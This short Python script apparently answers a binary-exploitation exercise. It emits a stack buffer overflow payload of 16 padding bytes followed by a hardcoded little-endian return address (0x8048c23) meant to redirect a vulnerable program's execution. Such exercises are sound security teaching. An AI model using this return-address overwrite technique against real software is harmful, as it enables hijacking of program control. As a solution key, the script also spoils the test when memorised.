import sys
if __name__ == "__main__":
    solution = b"A" * 16
    solution += 0x8048c23.to_bytes(4, "little")
    sys.stdout.buffer.write(solution)
    